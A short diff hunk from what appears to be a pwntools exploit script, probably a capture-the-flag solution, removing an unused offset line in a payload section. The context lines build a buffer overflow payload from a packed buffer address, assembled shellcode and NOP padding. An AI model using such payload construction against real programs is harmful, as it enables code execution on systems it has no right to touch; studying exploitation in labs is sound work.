@@ -182,7 +182,6 @@ shellcode = asm('''
 
 #--------------------------------[ STEP 4 : PAYLOAD ]--------------------------------
 
-offset = 16
 payload=p64(buf_addr+8)
 payload+= shellcode
 payload+= b'\x90' * (72 - len(payload) )
